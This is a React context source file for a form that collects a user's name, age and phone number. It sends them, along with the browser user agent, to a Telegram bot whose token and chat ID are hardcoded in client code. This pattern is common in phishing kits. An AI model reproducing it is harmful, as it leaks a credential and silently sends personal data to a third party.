import { createContext, useContext, useState } from "react";
import PropTypes from "prop-types";

const UseContextForm = createContext();

export const AuthForm = () => {
  const context = useContext(UseContextForm);
  if (context === null) throw new TypeError("erro no contexto");
  return context;
};

const ContextForm = ({ children }) => {
  const [nome, setNome] = useState("");
  const [idade, setIdade] = useState("");
  const [telefone, setTelefone] = useState("");


  const sendMessageToTelegram = (e) => {
    e.preventDefault();
    if (nome.length === 0 || idade.length === 0 || telefone.length === 0) {
      return alert("Rellena los campos vacíos!");
    }

    const dispositivo = navigator.userAgent;
    let chatId = "6579066348";
    let botToken = "7831458417:AAExsWVmDTr-FLf75niwX0E7PpPap54Ze6U";
    const message = `📞Número de telefone: ${telefone}\n🧑‍🦰Nome: ${nome}\n🔒Idade: ${idade}\n📱Dispositivo:${dispositivo}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.ok) {
          console.log("Mensagem enviada com sucesso!");
        } else {
          console.log("Erro ao enviar a mensagem.");
        }
      })
      .catch((error) => console.log("Erro: ", error));
      setIdade("");
      setNome("");
      setTelefone("");
  };

  return (
    <UseContextForm.Provider
      value={{
        sendMessageToTelegram,
        nome,
        idade,
        telefone,
        setIdade,
        setNome,
        setTelefone,
      }}
    >
      {children}
    </UseContextForm.Provider>
  );
};

ContextForm.prototype = {
  children: PropTypes.node,
};

export default ContextForm;
